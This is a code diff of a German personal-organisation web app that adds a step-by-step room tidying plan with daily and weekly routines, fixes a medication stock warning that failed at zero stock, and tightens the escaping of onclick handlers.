+  {id:'H2',b:'H',t:'Papiere einsortieren',min:15,
+   c:['Stapel bilden nach den fünf Reitern',
+      'Jeden Stapel in seine Mappe',
+      'Unklar: Mappe „Sonstiges“, nicht die prüfen-Kiste'],
+   not:'Nur die Ordnerrücken beschriften.',
+   nach:'Papiere haben einen Ort. Bereich H ist durch — das war der schwerste.'},
+
+  {id:'I1',b:'I',t:'Handballkorb',min:12,
+   c:['Textilien und Papier raus',
+      'Zeitschriften in den Flechtkorb im unteren Regalfach — der Korb ist die Grenze',
+      'Was nicht mehr reinpasst: entscheiden, nicht stapeln'],
+   not:'Nur Textilien und Papier raus.'},
+  {id:'I2',b:'I',t:'Bücherregal',min:12,
+   c:['Kleidung aus dem unteren Fach',
+      'Bücher ins mittlere Fach',
+      'Ein Fach bleibt frei'],
+   not:'Nur die Kleidung aus dem unteren Fach.',
+   nach:'Bereich I ist durch. Ab jetzt nur noch Reinigen.'},
+
+  {id:'J1',b:'J',t:'Lüften',min:1,
+   c:['Fenster weit auf, zehn Minuten'],not:null},
+  {id:'J2',b:'J',t:'Staub von oben nach unten',min:12,
+   c:['Höchste Ablage zuerst','Regale, Wandregal, Fensterbank','Boden zuletzt — sonst liegt der Staub wieder drauf'],not:null},
+  {id:'J3',b:'J',t:'Monitor, Tastatur, Maus',min:5,
+   c:['Gerät aus','Trocken in geraden Bahnen wischen','Tastatur umdrehen, ausklopfen'],not:null},
+  {id:'J4',b:'J',t:'Flächen feucht',min:12,
+   c:['Schreibtisch, Sideboard, Nachttisch, Fensterbänke','Leicht feucht, dann trocken nach'],not:null},
+  {id:'J5',b:'J',t:'Boden saugen',min:12,
+   c:['Boden komplett frei','Von der Ecke zur Tür'],not:null},
+  {id:'J6',b:'J',t:'Teppiche saugen',min:8,
+   c:['Teppiche einzeln','Darunter auch'],not:null},
+  {id:'J7',b:'J',t:'Bettwäsche wechseln',min:10,
+   c:['Alte Wäsche in den Korb','Frische aufziehen'],not:null,
+   nach:'Alle 35 Schritte einmal durch. Ab jetzt nur noch Abendrunde und Wochenrunde.'}
+];
+const ZP_SLOT=m=>Math.round(m*2.5);
+
+/* Nachschlagen beim Sortieren — kein Tracking */
+const ZP_ORTE=[
+  ['Hemden, Hosen, Trainingsjacken','Kleiderstange im Schrank'],
+  ['Getragen, noch nicht schmutzig','Sessel ODER linke Hälfte mittlerer Schrankboden — nur einer von beiden'],
+  ['T-Shirts, Pullover gefaltet','Fach dunkle Kleidung'],
+  ['Unterwäsche','Schublade 12, linker Kartoneinsatz'],
+  ['Socken','Schublade 12, rechter Kartoneinsatz'],
+  ['Sportwäsche schmutzig','Wäschekorb — vorher offen trocknen lassen'],
+  ['Büromaterial','Rollcontainer, schwarze Schublade'],
+  ['Karteikarten','Rollcontainer-Schublade und Karteikartenbox auf dem Schreibtisch'],
+  ['Stifte','Ein Köcher auf dem Schreibtisch, Rest im Rollcontainer'],
+  ['Bastelmaterial','Weidenkorb unter dem Schreibtisch'],
+  ['Kabel, Netzteile','Eine leere weiße Box'],
+  ['Kleinteile vom Mauspad','Sortier-Tablett auf dem Sideboard'],
+  ['Pflegeprodukte','Bambusbox auf dem Nachttisch'],
+  ['Medikamente','Rollcontainer oder Nachttischschublade 1, Blister im Umkarton — nicht Bad, nicht Küche'],
+  ['Privates','Geschlossener abwischbarer Behälter, Kabel raus'],
+  ['Dokumente','Hängeregistratur, fünf beschriftete Mappen, auf dem Regal'],
+  ['Handball-Zeitschriften','Flechtkorb im unteren Bücherregalfach — der Korb ist die Grenze'],
+  ['Bücher','Mittleres Bücherregalfach'],
+  ['Zu prüfen','Kiste unter dem Bett — sichtbar, nicht im Weg'],
+  ['Müll','Papierkorb, täglich leeren'],
+  ['Getränke','Ein Platz seitlich neben der Tastatur, sonst nirgends']
+];
+
+/* Abendrunde ab 22:30 — die Wenn-dann-Regeln aus dem Plan */
+const ZP_TAG=[
+  {wenn:'Der Wecker klingelt',           dann:'Fenster fünf bis zehn Minuten weit auf'},
+  {wenn:'Ich komme vom Training',        dann:'Nasse Sportkleidung sofort offen über die Sessellehne'},
+  {wenn:'Ich klappe den Laptop zu',      dann:'Flasche und Glas mit in die Küche'},
+  {wenn:'Es ist 22:30',                  dann:'Einmal durchs Zimmer: Boden leer, Müll in den Papierkorb'},
+  {wenn:'Der Papierkorb sieht voll aus', dann:'Beim nächsten Rausgehen mitnehmen'}
+];
+const ZP_ABEND={id:'zp-tag', t:'Einmal durchs Zimmer: Boden leer, Müll in den Papierkorb', min:5};
+
+/* Wochenrunde — Donnerstag nach dem Lernblock, Ersatz Sonntag */
+const ZP_WOCHE=[
+  'Alle Getränkebehälter raus',
+  'Alle Flächen abräumen: beide Schreibtische, Nachttisch, Sideboard, Fensterbänke',
+  'Sessel durchgehen — was länger als eine Woche liegt, in die Wäsche',
+  'Kiste „prüfen“ öffnen, genau drei Teile entscheiden, wieder zu',
+  'Bettwäsche wechseln — jede zweite Woche reicht'
+];
+
+const ZP_KAUF=[
+  {id:'buegel', n:'Kleiderbügel — IKEA SPRUTTIG, 3 × 10 Stück', eur:6,
+   warum:'Die Stange ist leer, weil nur zwei, drei Bügel im Zimmer sind.'},
+  {id:'kanal',  n:'Kabelkanal-Set — Hama 4 × 1 m, OBI', eur:19.59,
+   warum:'Kabel im Laufweg sind das, worüber man stolpert.'}
+];
+
+const ZP_OFFEN=[
+  'Sessel oder Schrankboden für „getragen, aber nochmal“?',
+  'Zwei Arbeitsplätze getrennt (nur Studium) oder gemischt?',
+  'Wie viele Sportgarnituren gibt es? Unter fünf ist es ein Mengenproblem, kein Ordnungsproblem',
+  'Wo steht die Waschmaschine, wer wäscht?',
+  'Was passiert mit den Heften, die nicht mehr in den Korb passen?',
+  'Gelbliche Flecken auf den weißen Polstern — Verfärbung oder Feuchtigkeit?',
+  'Medikamente nur nach Rücksprache mit Apotheke oder Praxis aussortieren',
+  'Einkäufe für rund 26 € — ja, nein, wann?',
+  'Wochenrunde wirklich Donnerstag 10:05, oder kollidiert das mit Kraft B?'
+];
+
+/* --- Zustand --- */
+const zpS=()=>S.haus.zimmer;
+function zpDone(id){ return !!zpS().done[id]; }
+function zpCount(){ return ZP.filter(s=>zpDone(s.id)).length; }
+function zpNext(){
+  const z=zpS();
+  if(z.bereich){ const s=ZP.find(x=>x.b===z.bereich && !zpDone(x.id)); if(s) return s; }
+  return ZP.find(x=>!zpDone(x.id))||null;
+}
+/* Tageszeit entscheidet, was der Schritt ist: 15–17 nur kurz, ab 22:30 die Abendrunde */
+function zpModus(){ const n=nowMin();
+  if(n>=1350 || n<hm2m(S.adhs.wake||'08:00')-45) return 'abend';
+  if(n>=900 && n<=1020) return 'dip';
+  return 'normal'; }
+function isoWeek(d){ const x=new Date(Date.UTC(d.getFullYear(),d.getMonth(),d.getDate()));
+  const day=x.getUTCDay()||7; x.setUTCDate(x.getUTCDate()+4-day);
+  const y0=new Date(Date.UTC(x.getUTCFullYear(),0,1));
+  return x.getUTCFullYear()+'-W'+pad(Math.ceil(((x-y0)/864e5+1)/7)); }
+function zpWocheKey(){ return isoWeek(new Date()); }
+function zpWocheFaellig(){ const d=new Date().getDay(); const n=nowMin();
+  if(zpS().woche[zpWocheKey()]) return false;
+  return (d===4||d===0) && n>=605; }
+function zpZuletzt(map){ const ks=Object.keys(map).sort(); if(!ks.length) return 'noch nie';
+  const diff=Math.round((parseISO(todayISO())-parseISO(ks[ks.length-1]))/864e5);
+  return diff===0?'heute':diff===1?'gestern':'vor '+diff+' Tagen'; }
+
+/* Was hausNext() liefert, wenn der Zimmerplan läuft */
+function zpHausNext(){
+  const z=zpS(); if(!z.aktiv) return null;
+  const md=zpModus();
+  if(md==='abend' && !z.tag[DAY])
+    return {s:ZP_ABEND, quelle:'Zimmer · Abendrunde', key:ZP_ABEND.id, zp:'tag'};
+  const s=zpNext(); if(!s) return null;
+  const kurz = md==='dip' || z.kurz;
+  const ber=ZP_BER.find(b=>b.id===s.b);
+  return {s:{id:s.id, t:(kurz&&s.not)?s.not:s.t, min:(kurz&&s.not)?3:s.min},
+          quelle:'Zimmer · '+ber.n, key:s.id, zp:'schritt', step:s, kurz, dip:md==='dip'};
+}
+
+window.zpStart=()=>{ const z=zpS(); z.aktiv=true; z.start=z.start||todayISO(); save(); render();
+  toast('Zimmerplan läuft — ein Schritt nach dem anderen'); };
+window.zpPause=()=>{ zpS().aktiv=false; save(); render(); };
+window.zpCheck=(id,i)=>{ const z=zpS(); const a=z.checks[id]=z.checks[id]||[];
+  a[i]=!a[i]; save(); render(); };
+window.zpKurz=v=>{ zpS().kurz=!!v; save(); render(); };
+window.zpBereich=b=>{ const z=zpS(); z.bereich=(z.bereich===b)?null:b; z.auf=false; save(); render(); };
+window.zpAuf=k=>{ const z=zpS(); z[k]=!z[k]; save(); render(); };
+window.zpKauf=(id,st)=>{ zpS().kauf[id]=st; save(); render(); };
+window.zpTagTick=()=>{ zpS().tag[DAY]=true; save(); render(); toast('Abendrunde erledigt'); };
+window.zpWocheTick=()=>{ zpS().woche[zpWocheKey()]=true; save(); render(); toast('Wochenrunde erledigt'); };
+window.zpTick=id=>{ const z=zpS(); const s=ZP.find(x=>x.id===id); if(!s) return;
+  const chk=z.checks[id]||[]; const voll=s.c.every((_,i)=>chk[i]);
+  z.done[id]={am:todayISO(), voll}; z.kurz=false;
+  if(z.bereich && !ZP.some(x=>x.b===z.bereich && !zpDone(x.id))) z.bereich=null;
+  save(); render();
+  toast(s.nach || (voll?'Erledigt · '+zpCount()+' von 35':'Zählt · '+zpCount()+' von 35')); };
+window.zpUndo=id=>{ delete zpS().done[id]; save(); render(); };
+window.zpOrte=()=>openSheet(`<h2>Wohin damit?</h2>
+  <div class="small muted" style="margin-bottom:10px">Für jede Sache genau ein Ort.</div>
+  ${ZP_ORTE.map(([a,b])=>`<div class="item" style="padding:8px 0"><div class="g">
+    <b style="font-weight:520;white-space:normal;font-size:14px">${esc(a)}</b><span style="white-space:normal">${esc(b)}</span></div></div>`).join('')}
+  <div class="spacer"></div><button class="btn" onclick="closeSheet()">Zurück</button>`);
+
+/* --- Karten --- */
+function zpTopCard(nx){
+  const z=zpS(), n=zpCount();
+  let h=`<div class="row between xs dim" style="margin:2px 2px 6px">
+    <span>Zimmerplan · ${n} von 35</span><span>${z.bereich?'Bereich '+z.bereich+' gewählt':'feste Reihenfolge'}</span></div>
+  <div class="bar" style="margin-bottom:10px"><i style="width:${Math.round(n/35*100)}%"></i></div>`;
+  if(nx.zp==='tag'){
+    h+=`<div class="now fix" style="--f1:#2f2717;--f2:#1a1d24;--fc:#f8c168">
+      <div class="now-k">${esc(nx.quelle)} · ca. 5 min</div>
+      <div class="now-t">${esc(nx.s.t)}</div>
+      <div class="now-s">Nicht mehr. Der nächste große Schritt kommt morgen.</div></div>
+    <div class="btnrow" style="margin-bottom:14px">
+      <button class="btn acc" onclick="zpTagTick()">Erledigt</button>
+      <button class="btn ghost sm" onclick="zpOrte()">Wohin damit?</button></div>`;
+    return h;
+  }
+  const s=nx.step, chk=z.checks[s.id]||[];
+  h+=`<div class="now fix" style="--f1:#2f2717;--f2:#1a1d24;--fc:#f8c168">
+    <div class="now-k">${esc(nx.quelle)} · ${s.id}</div>
+    <div class="now-t">${esc(s.t)}</div>
+    <div class="now-s">${nx.kurz&&s.not?esc(s.not):`ca. ${s.min} min — plane ${ZP_SLOT(s.min)}`}</div>
+    ${nx.dip?'<div class="now-s" style="color:var(--amber)">Gerade dein Tief. Nur die kurze Fassung, wenn überhaupt.</div>':''}
+  </div>`;
+  if(!(nx.kurz&&s.not)){
+    h+=`<div class="card tight" style="margin-bottom:8px">
+      ${s.c.map((c,i)=>`<div class="item" style="padding:6px 0">
+        <button class="tick ${chk[i]?'on':''}" onclick="zpCheck('${s.id}',${i})">${chk[i]?'&#10003;':''}</button>
+        <div class="g"><b style="font-weight:480;white-space:normal;font-size:14px">${esc(c)}</b></div></div>`).join('')}
+      <div class="xs muted" style="margin-top:6px">Auch teilweise fertig zählt.</div></div>`;
+  }
+  h+=`<div class="btnrow" style="margin-bottom:8px">
+    <button class="btn acc" onclick="zpTick('${s.id}')">Fertig</button>
+    ${s.not&&!nx.dip?`<button class="btn" onclick="zpKurz(${nx.kurz?'false':'true'})">${nx.kurz?'Lange Fassung':'Nur kurz'}</button>`:''}
+  </div>
+  <div class="btnrow" style="margin-bottom:14px">
+    <button class="btn ghost sm" onclick="zpOrte()">Wohin damit?</button>
+    <button class="btn ghost sm" onclick="zpAuf('auf')">Alle Bereiche</button>
+    <button class="btn ghost sm" onclick="go('fokus')">Timer</button>
+  </div>`;
+  return h;
+}
+
+function zpCards(){
+  const z=zpS(); let h='';
+  if(!z.aktiv){
+    const n=zpCount();
+    h+=`<div class="card">
+      <h2>Zimmerplan</h2>
+      <div class="small muted" style="margin-bottom:11px">35 Schritte für genau dein Zimmer, aus den Fotos
+        gebaut. Feste Reihenfolge, immer nur einer sichtbar, jeder unter einer Viertelstunde.
+        ${n?n+' von 35 sind schon durch.':'Strom und Kabel zuerst, Reinigen zuletzt.'}</div>
+      <button class="btn" onclick="zpStart()">${n?'Weitermachen':'Zimmerplan starten'}</button></div>`;
+    return h;
+  }
+  const fertig=!zpNext();
+  if(fertig) h+=`<div class="card tight" style="border-color:var(--acc)">
+    <div class="small"><b>Alle 35 Schritte sind einmal durch.</b> Abendrunde und Wochenrunde laufen weiter.</div></div>`;
+
+  /* Alle Bereiche — nur auf Wunsch */
+  if(z.auf) h+=`<div class="card">
+    <div class="row between" style="margin-bottom:8px"><h2 style="margin:0">Alle Bereiche</h2>
+      <button class="btn sm ghost" onclick="zpAuf('auf')">Zu</button></div>
+    ${ZP_BER.map(b=>{ const all=ZP.filter(s=>s.b===b.id), d=all.filter(s=>zpDone(s.id)).length;
+      return `<div class="item" style="padding:7px 0">
+        <button class="pill ${z.bereich===b.id?'on':''}" style="min-width:34px;justify-content:center" onclick="zpBereich('${b.id}')">${b.id}</button>
+        <div class="g"><b style="font-weight:520;white-space:normal;font-size:14px">${esc(b.n)}</b>
+          <span>${d}/${all.length} · ${esc(b.warum)}</span></div>
+        ${d===all.length?'<span class="xs" style="color:var(--acc)">✓</span>':''}</div>`;}).join('')}
+    <div class="note">Antippen wählt den Bereich für den nächsten Schritt. Die Reihenfolge innerhalb
+      eines Bereichs bleibt fest.</div></div>`;
+
+  /* Wochenrunde */
+  if(zpWocheFaellig()) h+=`<div class="card" style="border-color:var(--acc)">
+    <h2>Wochenrunde</h2>
+    <div class="xs muted" style="margin-bottom:8px">${new Date().getDay()===4?'Donnerstag nach dem Lernblock':'Sonntag, der Ersatztermin'} · zuletzt ${zpZuletzt(z.woche)}</div>
+    <ol style="padding-left:20px;margin:0 0 12px;font-size:13.5px;line-height:1.7">${ZP_WOCHE.map(x=>`<li>${esc(x)}</li>`).join('')}</ol>
+    <button class="btn acc" onclick="zpWocheTick()">Erledigt</button></div>`;
+
+  /* Abendrunde und Wenn-dann — eingeklappt */
+  h+=`<div class="card">
+    <div class="row between"><h2 style="margin:0">Jeden Tag</h2>
+      <button class="btn sm ghost" onclick="zpAuf('aufTag')">${z.aufTag?'Zu':'Zeigen'}</button></div>
+    <div class="xs muted" style="margin-top:4px">Abendrunde zuletzt ${zpZuletzt(z.tag)} · Wochenrunde zuletzt ${zpZuletzt(z.woche)}</div>
+    ${z.aufTag?`<div class="hr"></div>${ZP_TAG.map(r=>`<div class="item" style="padding:6px 0"><div class="g">
+        <span style="white-space:normal">Wenn: ${esc(r.wenn)}</span>
+        <b style="font-weight:520;white-space:normal;font-size:14px">${esc(r.dann)}</b></div></div>`).join('')}
+      <div class="note">Ab 22:30 wird die Abendrunde zum nächsten Schritt. Kein Zähler in Folge — ein
+        ausgelassener Tag ist ausgelassen, nicht verloren.</div>`:''}
+  </div>`;
+
+  /* Einkauf */
+  const offen=ZP_KAUF.filter(k=>(z.kauf[k.id]||'offen')==='offen');
+  h+=`<div class="card">
+    <h2>Einkauf${offen.length?' · '+offen.length+' offen':''}</h2>
+    ${ZP_KAUF.map(k=>{ const st=z.kauf[k.id]||'offen';
+      return `<div class="item" style="padding:7px 0"><div class="g">
+        <b style="font-weight:520;white-space:normal;font-size:14px;${st!=='offen'?'opacity:.55':''}">${esc(k.n)} · ${k.eur.toFixed(2).replace('.',',')} €</b>
+        <span style="white-space:normal">${esc(k.warum)}</span>
+        <div class="chips" style="margin-top:6px">
+          <button class="pill ${st==='gekauft'?'on':''}" onclick="zpKauf('${k.id}','gekauft')">Gekauft</button>
+          <button class="pill ${st==='verzichtet'?'on':''}" onclick="zpKauf('${k.id}','verzichtet')">Verzichte</button>
+          ${st!=='offen'?`<button class="pill" onclick="zpKauf('${k.id}','offen')">Offen</button>`:''}
+        </div></div></div>`;}).join('')}
+    <div class="note">Zusammen unter der 75-€-Grenze. Die App merkt sich nur den Stand.</div></div>`;
+
+  /* Offene Entscheidungen — eingeklappt */
+  h+=`<div class="card">
+    <div class="row between"><h2 style="margin:0">Offene Entscheidungen</h2>
+      <button class="btn sm ghost" onclick="zpAuf('aufOffen')">${z.aufOffen?'Zu':ZP_OFFEN.length}</button></div>
+    ${z.aufOffen?`<div class="hr"></div><ul style="padding-left:18px;margin:0;font-size:13.5px;line-height:1.7">${ZP_OFFEN.map(x=>`<li>${esc(x)}</li>`).join('')}</ul>
+      <div class="note">Nur Anzeige. Nichts davon blockiert einen Schritt.</div>`:''}
+  </div>
+  <div class="card tight"><div class="row between"><span class="small muted">Zimmerplan pausieren</span>
+    <button class="btn sm ghost" onclick="zpPause()">Pause</button></div></div>`;
+  return h;
+}
+
 /* --- Ansicht --- */
 function vHaus(){
   const nx=hausNext(), z=S.haus.zone||'zimmer', Z=ZONE[z];
@@ -2725,7 +3269,9 @@ function vHaus(){
       <button class="btn ghost sm" onclick="hausRescue()">Beenden</button></div>`;
   }
 
-  if(nx){
+  if(nx && nx.zp){
+    h+=zpTopCard(nx);
+  } else if(nx){
     const line=styleLine(nx.s.v);
     h+=`<div class="now fix" style="--f1:#2f2717;--f2:#1a1d24;--fc:#f8c168">
       <div class="now-k">${esc(nx.quelle)} · ca. ${nx.s.min} min</div>
@@ -2749,7 +3295,14 @@ function vHaus(){
       <button class="btn ghost sm" onclick="hausResetDay()">Von vorn beginnen</button></div>`;
   }
 
-  h+=`<div class="card">
+  h+=zpCards();
+
+  /* Der allgemeine Haushalt (Zonen, Grundreset, Rhythmen, feste Orte, Tipps) ist
+     generisch. Läuft der konkrete Zimmerplan, würde er darunter die Seite volllaufen
+     lassen — genau die Überfrachtung, die Maik bei der Regeneration bemängelt hat.
+     Deshalb steckt er dann hinter einem Aufklapper und ist nur einen Tipp entfernt. */
+  let gen='';
+  gen+=`<div class="card">
     <h2>Zone</h2>
     <div class="chips" style="margin-bottom:12px">
       ${Object.entries(ZONE).map(([k,v])=>{
@@ -2767,7 +3320,7 @@ function vHaus(){
       Die App füllt keine freie Minute automatisch.</div>
   </div>`;
 
-  if(!S.haus.rescue[DAY]) h+=`<div class="card tight">
+  if(!S.haus.rescue[DAY]) gen+=`<div class="card tight">
     <div class="row between"><span class="small muted">Überfordert?</span>
       <button class="btn sm" onclick="hausRescue()">Rettungsmodus</button></div></div>`;
 
@@ -2775,7 +3328,7 @@ function vHaus(){
   if(S.haus.reset.active){
     const blk=RESET.find(b=>b.d===S.haus.reset.day);
     const done=blk.steps.filter(s=>hausDone('reset',s.id)).length;
-    h+=`<div class="card" style="border-color:var(--acc)">
+    gen+=`<div class="card" style="border-color:var(--acc)">
       <div class="row between" style="margin-bottom:8px">
         <h2 style="margin:0">Grundreset · Tag ${blk.d}</h2>
         <span class="xs muted mono">${done}/${blk.steps.length}</span></div>
@@ -2793,7 +3346,7 @@ function vHaus(){
         fertig, geht es am nächsten offenen Schritt weiter — nie wieder bei null.</div>
     </div>`;
   } else if(!S.haus.reset.fertig){
-    h+=`<div class="card">
+    gen+=`<div class="card">
       <h2>Einmaliger Grundreset</h2>
       <div class="small muted" style="margin-bottom:11px">Drei Tage, danach nur noch Erhaltung.
         Funktionsrettung, dann Zimmer und Küche, dann Auto und Abschluss. Startet danach nie
@@ -2802,7 +3355,7 @@ function vHaus(){
   }
 
   /* Rhythmen */
-  h+=`<div class="card">
+  gen+=`<div class="card">
     <h2>Rhythmen${dueRhy.length?` · ${dueRhy.length} fällig`:''}</h2>
     ${RHY.map(r=>{const st=rhyDue(r.k);
       return `<div class="item"><div class="g"><b style="font-weight:520;white-space:normal;font-size:14px">${esc(r.n)}</b>
@@ -2815,7 +3368,7 @@ function vHaus(){
   </div>`;
 
   /* Feste Orte */
-  h+=`<div class="card">
+  gen+=`<div class="card">
     <h2>Feste Orte</h2>
     <div class="small muted" style="margin-bottom:11px">Vier Behälter, mehr nicht. Alles ohne festen
       Platz kommt in genau eine Box — nicht in eine neue Kiste.</div>
@@ -2827,7 +3380,7 @@ function vHaus(){
   </div>`;
 
   /* Gut genug */
-  h+=`<div class="card">
+  gen+=`<div class="card">
     <h2>„Gut genug“</h2>
     <div class="small muted" style="line-height:1.7">
       <b>Zimmer:</b> Wege frei, Müll und Flaschen am Platz, schmutzige Wäsche im Korb.<br>
@@ -2836,18 +3389,26 @@ function vHaus(){
     <div class="note">Das ist der Erhaltungsstandard, nicht der Grundreset. Alles darüber ist freiwillig.</div>
   </div>`;
 
-  h+=`<div class="card">
+  gen+=`<div class="card">
     <h2>Tipps &amp; Anleitungen</h2>
     <div class="chips">${Object.entries(TIPP).map(([k,t])=>
       `<button class="pill" onclick="tipp('${k}')">${esc(t.t)}</button>`).join('')}</div>
   </div>`;
 
-  h+=`<div class="card tight">${evTag('C')}
+  gen+=`<div class="card tight">${evTag('C')}
     <div class="small muted" style="margin-top:8px">Fachkonsens der Ergotherapie und Routinenforschung
       stützen Umgebungsanpassung, Anker und kleine Schritte. Kontrollierte Studien zum Sauberhalten
       von Küche, Zimmer und Auto bei Erwachsenen mit ADHS gibt es nicht. Das hier ist ein persönliches
-      Experiment mit Ergebnismaß, keine belegte Methode.</div></div>
-  <div style="height:20px"></div>`;
+      Experiment mit Ergebnismaß, keine belegte Methode.</div></div>`;
+
+  if(zpS().aktiv){
+    h+=`<div class="card">
+      <div class="row between"><h2 style="margin:0">Sonstiger Haushalt</h2>
+        <button class="btn sm ghost" onclick="zpAuf('aufGen')">${zpS().aufGen?'Zu':'Auto, Küche, Rhythmen'}</button></div>
+      ${zpS().aufGen?'<div class="hr"></div>'+gen:'<div class="note">Zonen, Grundreset, Rhythmen und feste Orte. Ausgeblendet, solange der Zimmerplan läuft.</div>'}
+    </div>`;
+  } else { h+=gen; }
+  h+=`<div style="height:20px"></div>`;
   return h;
 }
 window.resetTick=id=>{ const m=S.haus.done['reset']=S.haus.done['reset']||{};
@@ -3052,7 +3613,7 @@ function vTools(){
       ${t.s.map(x=>`<li>${esc(x)}</li>`).join('')}</ol>
     ${t.note?`<div class="note">${esc(t.note)}</div>`:''}
     <div class="spacer"></div>
-    <button class="btn sm ghost" onclick="startFocus(2,'${esc(t.t)}')">Zwei Minuten starten</button>
+    <button class="btn sm ghost" onclick="startFocus(2,$a(${A(t.t)}))">Zwei Minuten starten</button>
   </div>`).join('')}
   <div style="height:20px"></div>`;
 }
@@ -3084,7 +3645,11 @@ window.medRefill=id=>{ const it=meds().find(x=>x.id===id); if(!it) return;
    Ein nie erfasster Bestand ist kein Notfall — eine Warnung, die falsch losgeht,
    wird als erste ignoriert und nimmt allen echten Warnungen die Wirkung. */
 function medRange(it){ const s=it.stock||0;
-  return {tage:s, unbekannt:s===0 && !it.erfasst, warn: s>0 && s<=(it.puffer||7)}; }
+  /* Vorher stand hier s>0. Damit erlosch die Warnung ausgerechnet bei
+     Bestand 0 — dem Moment, in dem sie am nötigsten ist. Jetzt zählt nur,
+     ob der Bestand überhaupt einmal erfasst wurde. */
+  return {tage:s, unbekannt:s===0 && !it.erfasst,
+          warn: !!it.erfasst && s<=(it.puffer||7), leer: !!it.erfasst && s===0}; }
 
 function vMed(){
   const M=meds();
@@ -3140,7 +3705,10 @@ function vMed(){
       <label class="f"><span>Geplante Einnahmezeit</span>
         <input type="time" value="${esc(it.zeit)}" onchange="medSet('${it.id}','zeit',this.value)"></label>
       <button class="btn sm" onclick="medRefill('${it.id}')">Packung erhalten (+${it.pack||30})</button>
-      ${r.warn?`<div class="warn">Noch ${r.tage} Tage. Rezept jetzt anstoßen, nicht am letzten Tag —
+      ${r.leer?`<div class="warn"><b>Bestand ist leer.</b> Wenn du heute noch nicht genommen hast,
+        brauchst du jetzt Nachschub. Was bei einer ausgefallenen Einnahme gilt, steht in deiner
+        Packungsinformation oder kommt von deiner Ärztin.</div>`
+       :r.warn?`<div class="warn">Noch ${r.tage} Tage. Rezept jetzt anstoßen, nicht am letzten Tag —
         der Puffer ist genau dafür da.</div>`
        :r.unbekannt?`<div class="note">Bestand noch nicht erfasst. Trag einmal ein, für wie viele
         Tage die Packung reicht — danach zählt die App selbst herunter.</div>`:''}
@@ -3306,12 +3874,12 @@ window.kaufEval=()=>{
       <div class="small" style="line-height:1.7">${gruende.map(g=>'· '+esc(g)).join('<br>')}
       <br><br><b>Vorschlag:</b> Foto oder Barcode speichern, Warenkorb oder Geschäft jetzt verlassen.
       Morgen steht es auf der Wunschliste, und du entscheidest ohne den Moment.</div></div>
-    <button class="btn acc" onclick="wishAdd('${esc(n).replace(/'/g,'')}',${p})">Auf die Wunschliste, 24 Stunden</button>
+    <button class="btn acc" onclick="wishAdd($a(${A(n)}),${p})">Auf die Wunschliste, 24 Stunden</button>
     <div class="spacer"></div>
-    <button class="btn ghost" onclick="kaufLog('${esc(n).replace(/'/g,'')}',${p},'trotzdem')">Ich kaufe es trotzdem</button>`
+    <button class="btn ghost" onclick="kaufLog($a(${A(n)}),${p},'trotzdem')">Ich kaufe es trotzdem</button>`
    :`<div class="card tight" style="border-color:var(--acc);margin-bottom:12px">
       <div class="small">${geplant?'Das stand fest. Keine Reibung nötig.':'Unter deiner Grenze und nicht spät. Passt.'}</div></div>
-    <button class="btn acc" onclick="kaufLog('${esc(n).replace(/'/g,'')}',${p},'gekauft')">Erledigt</button>`}
+    <button class="btn acc" onclick="kaufLog($a(${A(n)}),${p},'gekauft')">Erledigt</button>`}
   <div class="note">Diese Regeln sind deine, nicht die der Wissenschaft. Selbstbindung und
     Zugriffshürden sind als Strategieklasse belegt; eine bestimmte Wartezeit oder Eurogrenze ist es
     nicht. ${Q('impuls')}</div>`);
@@ -3500,7 +4068,7 @@ function chipBlock(k,mood,label){
     <div class="chips" style="margin-bottom:14px">
       <button class="pill" onclick="jAddOpt('${k}')" style="font-weight:700">+</button>
       ${list.map(v=>`<button class="pill ${JD[k].includes(v)?'on':''}"
-        onclick="jPick('${k}','${esc(v).replace(/'/g,'')}')">${esc(v)}</button>`).join('')}
+        onclick="jPick('${k}',$a(${A(v)}))">${esc(v)}</button>`).join('')}
     </div>`;
 }
 
@@ -4071,6 +4639,9 @@ function vBeschw(){
         ${l?` · zuletzt ${human(l.d)}`:''}</div>
       ${b.verlauf.length>1?`<div class="bar" style="margin-bottom:10px">
         <i style="width:${clamp(l.score,0,100)}%;background:var(--amber)"></i></div>`:''}
+      ${l&&l.score>=50?`<div class="warn">Die Werte sind seit Längerem hoch. Das gehört
+        ärztlich oder physiotherapeutisch angesehen — diese Seite bewertet es nicht.</div>
+        <div class="spacer"></div>`:''}
       <div class="btnrow">
         <button class="btn sm acc" onclick="beschwLog('${b.id}')">Verlauf eintragen</button>
         <button class="btn sm ghost" onclick="beschwClose('${b.id}')">Abgeklungen</button></div>
@@ -4120,7 +4691,7 @@ function vWeek(){
     ${top.map(([t,n])=>`<div class="item"><div class="g"><b style="font-weight:520">${esc(t)}</b></div>
       <div class="v">${n}×</div></div>`).join('')}
     <div class="hr"></div>
-    <button class="btn sm" onclick="ruleFromTrigger('${esc(top[0][0])}')">
+    <button class="btn sm" onclick="ruleFromTrigger($a(${A(top[0][0])}))">
       Wenn-dann-Regel für „${esc(top[0][0])}“ anlegen</button>
     <div class="note">Der häufigste Auslöser ist der einzige, für den sich eine Regel lohnt.
       Drei Regeln gleichzeitig heißt keine Regel.</div></div>`:''}
@@ -4299,6 +4870,12 @@ const REG=[
    was:'3 bis 5 g Kreatin-Monohydrat. Kein Aufladen nötig, einfach jeden Tag. Auf die Kölner Liste achten.',
    w:'Die einzige Nahrungsergänzung im Bericht mit klar passendem Wirkprofil. Alles andere außer Koffein ist schwach belegt oder unbelegt.',
    q:'REGENERATION.md Abschnitt 13, Quellen [58, 110]'},
+
+  {id:'beine', n:'Beine hoch auf dem Venenengel', s:RG_C, typ:'optional',
+   wann:['team','kraft','spiel','frei','trainer','nachspiel'], phase:'Abends oder wenn die Beine schwer sind', braucht:'venen',
+   was:'Zehn bis zwanzig Minuten, Beine oben, nichts tun.',
+   w:'Angenehm und unschädlich. Ob es der Erholung nach Training hilft, hat niemand brauchbar untersucht — eine Suche in der medizinischen Datenbank findet dazu keine einzige Studie an Sportlern. Mach es, weil es gut tut, nicht weil es regeneriert.',
+   q:'PubMed-Suche 10.09.2026 zu Beinhochlagerung und Erholung nach Belastung: kein passender Treffer'},
 
   {id:'gehen', n:'Spazieren oder locker Rad', s:RG_C, typ:'optional',
    wann:['frei','trainer','nachspiel'], phase:'Wann du willst',
@@ -4517,7 +5094,7 @@ function vReg(){
       <h2>Was du hast</h2>
       <div class="chips">
         ${[['wanne','Badewanne'],['sauna','Sauna'],['rolle','Rolle / Massagepistole'],
-           ['kalt','Kaltwasser']].map(([k,l])=>
+           ['kalt','Kaltwasser'],['venen','Venenengel']].map(([k,l])=>
